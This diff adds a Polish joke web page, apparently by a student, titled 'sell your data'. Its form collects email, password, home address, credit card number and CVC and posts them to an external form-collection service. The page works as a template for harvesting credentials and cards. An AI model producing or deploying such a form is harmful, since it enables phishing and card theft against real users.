@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SPRZEDAJ SWOJE DANE</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <h1> Hej, może chcesz sprzedać mi swoje dane?</h1>
+    </header>
+    <main>
+        <form id="personalForm" action="https://usebasin.com/f/8d29a3509e28" method="post">
+            <label for="mail">Mail</label> <input type="text" name="mail" id="mail"><br>
+            <label for="haslo">Hasło</label> <input type="password" name="haslo" id="haslo"><br>
+            <label for="Adres">Adres zamieszkania</label> <input type="text" placeholder="Ulica, numer domu i mieszkania" name="adres" id="adres"><br>
+            <label for="Card_kredit">NUmer karty kredytowej</label> <input type="number" name="Card_kredit" id="Card_kredit"><br>
+            <label for="CVC">CVC</label><input type="number" name="CVC" id="CVC">
+            <button type="submit">POMÓŻ</button>
+        </form>
+        <p id="submitMessage" class="submitted">Formularz został wysłany!</p>
+    </main>
+    <footer>
+        <h3>Weź wspomóż biednego ucznia</h3>
+    </footer>
+    <script>
+        function handleSubmit(event) {
+            event.preventDefault();
+            const form = event.target;
+            const message = document.getElementById('submitMessage');
+            
+            // Pokazanie komunikatu o wysłaniu
+            message.style.display = 'block';
+            
+            // Wyczyszczenie formularza
+            form.reset();
+            
+            // Ukrycie komunikatu po 3 sekundach
+            setTimeout(() => {
+                message.style.display = 'none';
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
